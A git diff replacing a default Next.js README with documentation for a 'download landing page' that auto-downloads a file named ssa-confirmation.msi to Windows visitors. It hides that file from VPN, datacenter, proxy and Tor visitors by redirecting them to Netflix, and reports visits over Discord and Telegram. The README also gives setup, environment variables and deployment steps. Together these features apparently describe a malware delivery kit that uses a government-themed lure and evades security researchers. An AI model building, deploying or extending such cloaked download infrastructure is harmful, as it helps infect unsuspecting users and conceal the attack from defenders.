@@ -1,36 +1,106 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# Download Landing Page
+
+A Next.js 16 web application that serves as a download landing page with automatic platform detection, IP-based cloaking, and analytics tracking.
+
+## Features
+
+- Automatic platform detection (Windows/non-Windows)
+- Auto-triggers download for Windows users
+- IP-based cloaking (VPN/datacenter/proxy/Tor detection)
+- Unsafe visitors are redirected to Netflix
+- Analytics tracking via Discord webhooks and Telegram
+- Protected download endpoint with server-side IP verification
 
 ## Getting Started
 
-First, run the development server:
+### Development
 
 ```bash
+npm install
 npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
 ```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+Open [http://localhost:5000](http://localhost:5000) with your browser.
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+### Production Build
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+```bash
+npm run build
+npm start
+```
 
-## Learn More
+## Environment Variables
 
-To learn more about Next.js, take a look at the following resources:
+Copy `.env.example` to `.env.local` and configure:
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+```env
+# Notification Services (Optional)
+DISCORD_WEBHOOK_URL=your-discord-webhook-url
+TELEGRAM_BOT_TOKEN=your-telegram-bot-token
+TELEGRAM_CHAT_ID=your-telegram-chat-id
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+# IP Detection (Optional - get from ipapi.is)
+IPAPI_API_KEY=your-ipapi-key
+```
 
-## Deploy on Vercel
+## Deployment
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+### Deploy to Vercel
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+1. Push your code to GitHub
+2. Import your repository on [Vercel](https://vercel.com/new)
+3. Add your environment variables in the Vercel dashboard
+4. Deploy
+
+[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new)
+
+### Deploy to Railway
+
+1. Push your code to GitHub
+2. Create a new project on [Railway](https://railway.app)
+3. Connect your GitHub repository
+4. Add environment variables in Railway dashboard
+5. Railway will automatically detect Next.js and deploy
+
+**Railway Configuration:**
+- Build Command: `npm run build`
+- Start Command: `npm run start:prod`
+
+[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new)
+
+### Deploy to Replit
+
+The project is already configured for Replit:
+- Development server runs on port 5000
+- Use the "Publish" button in Replit to deploy
+
+## Project Structure
+
+```
+src/
+├── app/
+│   ├── api/
+│   │   ├── check-ip/route.ts   # IP safety check
+│   │   ├── download/route.ts   # Protected download
+│   │   └── track/route.ts      # Analytics tracking
+│   ├── page.tsx                # Main landing page
+│   └── layout.tsx              # Root layout
+├── components/
+│   ├── DownloadGuide.tsx       # Download notification
+│   └── PlatformModal.tsx       # Platform warning modal
+└── lib/
+    └── ipCheck.ts              # IP cloaking detection
+protected/
+└── ssa-confirmation.msi        # Protected download file
+```
+
+## Tech Stack
+
+- **Framework:** Next.js 16 (App Router)
+- **Language:** TypeScript
+- **Styling:** Tailwind CSS 4
+- **Runtime:** Node.js 18+
+
+## License
+
+Private
